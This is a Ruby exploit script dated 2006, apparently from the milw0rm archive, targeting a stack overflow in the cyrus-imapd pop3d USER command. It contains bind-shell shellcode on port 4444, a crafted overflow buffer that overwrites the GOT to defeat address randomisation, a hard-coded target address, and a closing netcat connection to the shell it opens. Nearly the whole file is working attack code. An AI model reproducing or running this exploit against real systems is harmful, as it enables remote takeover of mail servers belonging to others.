            #!/usr/bin/ruby
#
# cyrus-imapd pop3d exploit
# by bannedit
#
# 05/23/2006
#	This exploit takes advantage of a stack based overflow.
#	Once the stack corruption has occured it is possible
#	to overwrite a pointer which is later used for a memcpy
#	this gives us a write anything anywhere condition similar
#	to a format string vulnerability.
#	
#	I choose to overwrite the GOT table with my shellcode and
#	return to it. This defeats the VA random patch and possibly
#	other stack protection features.
#
#	tested on gentoo-sources linux 2.6.16



require 'socket'

#will add targets for other linux distros
targets = { 'linux 2.6' => '0x080fd318', 'linux 2.6 Hardened' => '', 'freebsd' => '' }


#metasploit bind shellcode by skape 84 bytes port 4444#

shellcode = 
"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"+
"\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"+
"\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"+
"\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"+
"\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"+
"\x89\xe1\xcd\x80"


puts "--[cyrus imapd pop3 popsubfolders exploit"
puts "----[by bannedit"
puts "-----------------------------------------"

case ARGV.length 

when 0
	puts "--- ./exploit [host] [options]"
	exit

when 1
	sock = TCPSocket.new(ARGV[0], "pop3")

when 2
	sock = TCPSocket.new(ARGV[0], "pop3")
	ret = ARGV[1].hex

end

ret = (targets['linux 2.6'].hex) 

puts "<- " + banner = sock.gets
puts "-> sending USER command"
printf " injecting shellcode: %d bytes\n", shellcode.length


#this alignment stuff should probably be cleaned up its kinda icky#

evil_buff = "USER " 
evil_buff <<"\x90" * 265 #(290 - shellcode.length)

evil_buff << ([ret].pack('V')) * 2 #return address
evil_buff <<"\x90" * (250 - shellcode.length) 
evil_buff << shellcode
evil_buff <<"\x90" * (29)
ret = ret - 277
evil_buff << ([ret].pack('V')) * 4 #0x080fd204
evil_buff <<"\r\n"

sock.send(evil_buff, 0)

sleep 9
puts " attempting to connect to #{ARGV[0]} port 4444"

cmd = "nc #{ARGV[0]} 4444"
system(cmd)

sock.close

# milw0rm.com [2006-07-21]